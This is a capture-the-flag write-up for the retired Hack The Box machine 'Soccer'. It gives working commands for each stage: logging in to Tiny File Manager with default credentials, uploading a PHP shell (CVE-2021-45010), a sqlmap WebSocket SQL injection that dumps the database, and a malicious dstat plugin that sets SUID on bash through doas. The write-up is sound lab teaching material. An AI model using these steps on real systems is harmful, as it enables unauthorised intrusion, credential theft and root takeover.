---
machine: Soccer
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / WebSocket SQLi
state: Retired
tags: [tiny-file-manager, cve-2021-45010, websocket, sqli, doas, dstat]
---

# Soccer — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

`/tiny` exposes **Tiny File Manager 2.4.3** with factory credentials (`admin:admin@123`). Its unrestricted upload (**CVE-2021-45010**) drops a PHP shell in `uploads/` → `www-data`. The nginx config reveals another host, `soc-player.soccer.htb`, with a **WebSocket** on 9091 vulnerable to **blind SQLi**; the database yields `player`'s SSH credentials. Then `doas` allows `dstat` as root: a Python plugin gives root.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
# 22 ssh, 80 http (nginx), 9091 (Express/WebSocket)
ffuf -u http://soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# tiny
```

## Access

1. **Tiny File Manager 2.4.3** at `http://soccer.htb/tiny/` with `admin:admin@123` (defaults published in its repo).
2. **PHP upload** into `tiny/uploads/` with the usual shell; visiting it gives `www-data`.
3. **Second vhost**: `/etc/nginx/sites-enabled/` shows `soc-player.soccer.htb` and its service on 9091.
4. **SQLi over WebSocket**: the client sends `{"id": "<ticket>"}`; drive `sqlmap` against `ws://`:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --batch -D soccer_db --dump
```

5. **SSH** with the credentials recovered for `player`.

## Escalation

```bash
cat /usr/local/etc/doas.conf
```

```text
permit nopass player as root cmd /usr/bin/dstat
```

`dstat` loads Python plugins; running as root it looks in `/usr/local/share/dstat/`:

```bash
mkdir -p /usr/local/share/dstat
cat > /usr/local/share/dstat/dstat_evil.py <<'EOF'
import os
os.system("chmod +s /bin/bash")
EOF
doas -u root /usr/bin/dstat --evil
```

## Pitfalls

- **`sqlmap` and WebSocket**: `websocket-client` is required; the `*` marks the injection point in the JSON.
- **Hosts**: add `soccer.htb` and `soc-player.soccer.htb` to `/etc/hosts`.
- **Plugin path**: `~/.dstat` will not work because root never reads `player`'s home.

## Lessons

- Factory credentials plus unrestricted upload is direct RCE.
- nginx config files enumerate internal hosts.
- SQLi does not always travel over HTTP: WebSocket too.
- `doas`/`sudo` on plugin-driven tools is code execution as root.
